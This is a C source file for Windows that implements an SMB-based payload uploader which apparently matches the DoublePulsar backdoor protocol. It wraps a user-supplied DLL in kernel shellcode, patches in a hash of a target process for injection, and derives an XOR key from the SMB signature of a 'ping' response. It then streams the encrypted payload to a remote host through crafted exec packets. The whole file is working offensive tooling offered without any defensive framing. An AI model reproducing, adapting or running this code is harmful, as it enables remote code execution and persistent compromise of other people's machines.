#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int upload_send_all(SOCKET socket_handle, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > (size_t)INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(socket_handle, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_exact(SOCKET socket_handle, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > (size_t)INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(socket_handle, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int upload_recv_frame(SOCKET socket_handle, uint8_t **frame_out, size_t *length_out)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *frame;

    *frame_out = NULL;
    *length_out = 0;

    if (upload_recv_exact(socket_handle, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];

    frame = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (frame == NULL)
        return -1;

    memcpy(frame, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_exact(socket_handle, frame + sizeof(header), body_length) != 0) {
        free(frame);
        return -1;
    }

    *frame_out = frame;
    *length_out = (size_t)body_length + sizeof(header);
    return 0;
}

static int upload_transact(SOCKET socket_handle, const uint8_t *packet, size_t packet_length,
                           uint8_t **response_out, size_t *response_length_out)
{
    *response_out = NULL;
    *response_length_out = 0;

    if (upload_send_all(socket_handle, packet, packet_length) != 0)
        return -1;

    return upload_recv_frame(socket_handle, response_out, response_length_out);
}

static void upload_put_le16(uint8_t *buffer, size_t offset, uint16_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
}

static void upload_put_le32(uint8_t *buffer, size_t offset, uint32_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
    buffer[offset + 2] = (uint8_t)(value >> 16);
    buffer[offset + 3] = (uint8_t)(value >> 24);
}

static uint32_t upload_get_le32(const uint8_t *buffer, size_t offset)
{
    return (uint32_t)buffer[offset] |
           ((uint32_t)buffer[offset + 1] << 8) |
           ((uint32_t)buffer[offset + 2] << 16) |
           ((uint32_t)buffer[offset + 3] << 24);
}

static void xor_buffer(uint8_t *buffer, size_t length, uint32_t key)
{
    size_t i;

    for (i = 0; i < length; ++i)
        buffer[i] ^= (uint8_t)(key >> ((i & 3u) * 8u));
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET socket_handle = INVALID_SOCKET;
    struct sockaddr_in address;
    HANDLE file_handle = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_length = 0;
    size_t payload_length = 0;
    uint16_t user_id = 0;
    uint16_t tree_id = 0;
    uint32_t xor_key;
    uint32_t signature;
    uint32_t inject_hash = 0;
    uint64_t patched_total;
    const unsigned char *inject_name;
    size_t i;
    int wsa_started = 0;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    file_handle = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE)
        goto cleanup;
    if (!GetFileSizeEx(file_handle, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX) {
        goto cleanup;
    }

    dll_length = (size_t)file_size.QuadPart;
    if (dll_length != 0) {
        dll = (uint8_t *)malloc(dll_length);
        if (dll == NULL)
            goto cleanup;

        i = 0;
        while (i < dll_length) {
            DWORD amount = (dll_length - i > (size_t)MAXDWORD)
                               ? MAXDWORD
                               : (DWORD)(dll_length - i);
            DWORD bytes_read = 0;
            if (!ReadFile(file_handle, dll + i, amount, &bytes_read, NULL) ||
                bytes_read == 0) {
                goto cleanup;
            }
            i += bytes_read;
        }
    }

    if (!CloseHandle(file_handle)) {
        file_handle = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file_handle = INVALID_HANDLE_VALUE;

    if ((uint64_t)dll_length + (uint64_t)KERNEL_RUNDLL_SIZE > UINT32_MAX)
        goto cleanup;
    patched_total = (uint64_t)dll_length + 3978u;
    if (patched_total > UINT32_MAX ||
        (size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4u) {
        goto cleanup;
    }

    payload_length = (size_t)KERNEL_RUNDLL_SIZE + dll_length;
    payload = (uint8_t *)malloc(payload_length == 0 ? 1 : payload_length);
    if (payload == NULL)
        goto cleanup;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_length != 0)
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_length);

    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_TOTAL_OFFSET, (uint32_t)patched_total);
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_length);
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET, 1u);

    inject_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*inject_name != '\0') {
        inject_hash = inject_hash * 127u + (uint32_t)*inject_name;
        ++inject_name;
    }
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    socket_handle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_handle == INVALID_SOCKET)
        goto cleanup;
    if (connect(socket_handle, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_transact(socket_handle, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1u,
                        &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_transact(socket_handle, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1u,
                        &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34u) {
        free(response);
        response = NULL;
        goto cleanup;
    }
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t tree_packet[sizeof(SMB_TREE_CONNECT_PKT)];
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_packet));
        if (sizeof(tree_packet) < 34u)
            goto cleanup;
        upload_put_le16(tree_packet, 32u, user_id);
        if (upload_transact(socket_handle, tree_packet, sizeof(SMB_TREE_CONNECT_PKT) - 1u,
                            &response, &response_length) != 0)
            goto cleanup;
    }
    if (response_length < 30u) {
        free(response);
        response = NULL;
        goto cleanup;
    }
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t ping_packet[sizeof(DP_PING_PKT)];
        memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
        if (sizeof(ping_packet) < 34u)
            goto cleanup;
        upload_put_le16(ping_packet, 28u, tree_id);
        upload_put_le16(ping_packet, 32u, user_id);
        if (upload_transact(socket_handle, ping_packet, sizeof(DP_PING_PKT) - 1u,
                            &response, &response_length) != 0)
            goto cleanup;
    }

    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4u) {
        free(response);
        response = NULL;
        goto cleanup;
    }
    signature = upload_get_le32(response, (size_t)SMB_RESP_SIGNATURE_START);
    xor_key = (2u * signature) ^
              ((((signature >> 16) | (signature & 0x00FF0000u)) >> 8) |
               (((signature << 16) | (signature & 0x0000FF00u)) << 8));
    free(response);
    response = NULL;

    xor_buffer(payload, payload_length, xor_key);

    if (SMB_EXEC_TEMPLATE_LEN < 4u ||
        (size_t)SMB_EXEC_TEMPLATE_LEN < (size_t)sizeof(DP_EXEC_PKT) - 1u)
        goto cleanup;

    {
        size_t offset = 0;
        uint8_t *exec_packet = NULL;
        size_t exec_capacity = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u +
                               (size_t)SMB_EXEC_SHELLCODE_LEN;

        if ((size_t)SMB_EXEC_SHELLCODE_LEN == 0 ||
            (size_t)SMB_EXEC_SHELLCODE_LEN > UINT16_MAX ||
            exec_capacity < (size_t)SMB_EXEC_TEMPLATE_LEN + 12u) {
            goto cleanup;
        }

        exec_packet = (uint8_t *)malloc(exec_capacity);
        if (exec_packet == NULL)
            goto cleanup;

        while (offset < payload_length) {
            size_t chunk = payload_length - offset;
            size_t packet_length;
            uint8_t parameters[12];
            uint32_t parameter_values[3];
            size_t j;
            size_t mux_offset = (size_t)DP_RESP_MUX_ID_OFFSET;

            if (chunk > (size_t)SMB_EXEC_SHELLCODE_LEN)
                chunk = (size_t)SMB_EXEC_SHELLCODE_LEN;
            packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u + chunk;

            if ((size_t)SMB_NETBIOS_LEN_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_NETBIOS_LEN_OFFSET < 3u ||
                (size_t)SMB_EXEC_TOTAL_DATA_OFFSET > packet_length ||
                packet_length - (size_t)SMB_EXEC_TOTAL_DATA_OFFSET < 2u ||
                (size_t)SMB_EXEC_DATA_COUNT_OFFSET > packet_length ||
                packet_length - (size_t)SMB_EXEC_DATA_COUNT_OFFSET < 2u ||
                (size_t)SMB_EXEC_BYTE_COUNT_OFFSET > packet_length ||
                packet_length - (size_t)SMB_EXEC_BYTE_COUNT_OFFSET < 2u ||
                (size_t)SMB_TID_OFFSET > packet_length ||
                packet_length - (size_t)SMB_TID_OFFSET < 2u ||
                (size_t)SMB_UID_OFFSET > packet_length ||
                packet_length - (size_t)SMB_UID_OFFSET < 2u ||
                (size_t)SMB_EXEC_TEMPLATE_LEN > packet_length ||
                packet_length - (size_t)SMB_EXEC_TEMPLATE_LEN < 12u ||
                chunk + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u < 4u ||
                chunk + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u - 4u > 0xFFFFFFu ||
                chunk + 12u > UINT16_MAX) {
                free(exec_packet);
                goto cleanup;
            }

            memcpy(exec_packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
            parameter_values[0] = (uint32_t)payload_length;
            parameter_values[1] = (uint32_t)chunk;
            parameter_values[2] = (uint32_t)offset;
            for (j = 0; j < 3u; ++j) {
                parameters[j * 4u] = (uint8_t)parameter_values[j];
                parameters[j * 4u + 1u] = (uint8_t)(parameter_values[j] >> 8);
                parameters[j * 4u + 2u] = (uint8_t)(parameter_values[j] >> 16);
                parameters[j * 4u + 3u] = (uint8_t)(parameter_values[j] >> 24);
            }
            xor_buffer(parameters, sizeof(parameters), xor_key);
            memcpy(exec_packet + (size_t)SMB_EXEC_TEMPLATE_LEN, parameters,
                   sizeof(parameters));
            memcpy(exec_packet + (size_t)SMB_EXEC_TEMPLATE_LEN + sizeof(parameters),
                   payload + offset, chunk);

            {
                uint32_t netbios_length = (uint32_t)(chunk +
                                          (size_t)SMB_EXEC_TEMPLATE_LEN + 12u - 4u);
                exec_packet[(size_t)SMB_NETBIOS_LEN_OFFSET] =
                    (uint8_t)(netbios_length >> 16);
                exec_packet[(size_t)SMB_NETBIOS_LEN_OFFSET + 1u] =
                    (uint8_t)(netbios_length >> 8);
                exec_packet[(size_t)SMB_NETBIOS_LEN_OFFSET + 2u] =
                    (uint8_t)netbios_length;
            }

            upload_put_le16(exec_packet, (size_t)SMB_EXEC_TOTAL_DATA_OFFSET,
                            (uint16_t)chunk);
            upload_put_le16(exec_packet, (size_t)SMB_EXEC_DATA_COUNT_OFFSET,
                            (uint16_t)chunk);
            upload_put_le16(exec_packet, (size_t)SMB_EXEC_BYTE_COUNT_OFFSET,
                            (uint16_t)(chunk + 12u));
            upload_put_le16(exec_packet, (size_t)SMB_TID_OFFSET, tree_id);
            upload_put_le16(exec_packet, (size_t)SMB_UID_OFFSET, user_id);

            if (upload_transact(socket_handle, exec_packet, packet_length,
                                &response, &response_length) != 0) {
                free(exec_packet);
                goto cleanup;
            }

            if (offset + chunk == payload_length) {
                if (mux_offset >= response_length ||
                    response[mux_offset] != (uint8_t)DP_MULTIPLEX_ID_EXEC) {
                    free(response);
                    response = NULL;
                    free(exec_packet);
                    goto cleanup;
                }
            }

            free(response);
            response = NULL;
            offset += chunk;
        }

        free(exec_packet);
    }

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (file_handle != INVALID_HANDLE_VALUE)
        CloseHandle(file_handle);
    if (socket_handle != INVALID_SOCKET)
        closesocket(socket_handle);
    free(payload);
    free(dll);
    if (wsa_started)
        WSACleanup();
    return result;
}